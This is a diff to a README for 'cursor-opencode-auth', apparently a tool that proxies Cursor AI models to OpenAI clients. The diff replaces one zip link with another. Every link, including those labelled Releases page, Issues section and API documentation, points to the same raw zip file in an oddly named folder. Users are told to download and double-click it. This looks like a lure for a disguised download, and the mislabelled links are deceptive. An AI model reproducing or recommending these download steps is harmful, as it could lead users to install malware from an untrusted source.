@@ -1,7 +1,7 @@
 # 🖱️ cursor-opencode-auth - Use OpenAI Models Easily
 
 ## 📥 Download Now!
-[![Download cursor-opencode-auth](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip)](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip)
+[![Download cursor-opencode-auth](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip)](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **cursor-opencode-auth**. This application serves as a proxy for Cursor AI models, making it simple to use them in OpenCode or any OpenAI client. Follow the steps below to get started quickly.
@@ -18,11 +18,11 @@ Before you download, ensure your computer meets these requirements:
 - **Customizable Settings**: Tailor the application to your preferences.
 
 ## 📦 Download & Install
-To download **cursor-opencode-auth**, you need to visit the [Releases page](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip).
+To download **cursor-opencode-auth**, you need to visit the [Releases page](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip).
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version.
-3. Click on the appropriate file for your operating system. You might see files with extensions such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip` for Linux.
+3. Click on the appropriate file for your operating system. You might see files with extensions such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip` for Linux.
 4. When the download finishes, locate the file in your downloads folder.
 5. Double-click the downloaded file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
@@ -39,7 +39,7 @@ If you encounter issues, check the following:
 - Consult the FAQ section on the Releases page for common problems.
 
 ## 📞 Support
-If you need further assistance, please reach out through the [Issues section](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip) on GitHub. You can ask questions or report bugs.
+If you need further assistance, please reach out through the [Issues section](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip) on GitHub. You can ask questions or report bugs.
 
 ## 🏗️ Community Contributions
 We welcome contributions from any user. If you have suggestions or improvements, please submit a pull request. Your help makes this project better!
@@ -48,7 +48,7 @@ We welcome contributions from any user. If you have suggestions or improvements,
 This software is open source and free to use. For more details, please refer to the LICENSE file in the repository.
 
 ## 🔗 Additional Resources
-- [OpenAI API Documentation](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip)
-- [Cursor AI Models Overview](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode-auth-cursor-2.5.zip)
+- [OpenAI API Documentation](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip)
+- [Cursor AI Models Overview](https://raw.githubusercontent.com/nhan665/cursor-opencode-auth/main/bubonocele/opencode_cursor_auth_v2.3.zip)
 
 For any other questions or information, feel free to consult the documentation available on our GitHub page. Happy coding!
